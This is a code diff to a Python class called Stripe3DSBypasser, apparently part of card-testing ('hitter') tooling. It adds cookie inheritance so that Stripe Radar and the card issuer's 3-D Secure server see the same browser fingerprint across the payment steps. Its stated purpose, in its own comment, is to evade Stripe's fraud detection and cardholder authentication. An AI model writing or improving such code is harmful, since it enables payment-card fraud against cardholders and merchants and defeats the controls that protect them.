@@ -872,7 +872,8 @@ class Stripe3DSBypasser:
 
     @classmethod
     async def resolve_3ds(cls, result: dict, proxy_data: Optional[dict] = None,
-                          profile: Optional[dict] = None) -> dict:
+                          profile: Optional[dict] = None,
+                          cookies: Optional[dict] = None) -> dict:
         raw_res = result.get("raw_response") or {}
         if not isinstance(raw_res, dict):
             return result
@@ -913,6 +914,15 @@ class Stripe3DSBypasser:
                 proxies=proxies,
                 timeout=30,
             ) as sess:
+                # Inherit Stripe session cookies from hitter so Radar and ACS see the
+                # same browser fingerprint across confirm → fingerprint → authenticate.
+                # Without this, two different ChromeSessions = two different browsers.
+                if cookies and isinstance(cookies, dict):
+                    for _ck, _cv in cookies.items():
+                        try:
+                            sess.cookies.set(_ck, str(_cv), domain=".stripe.com")
+                        except Exception:
+                            pass
                 act_type = next_action.get("type")
                 sdk_block = _as_dict(next_action.get("use_stripe_sdk"))
                 outcome = None
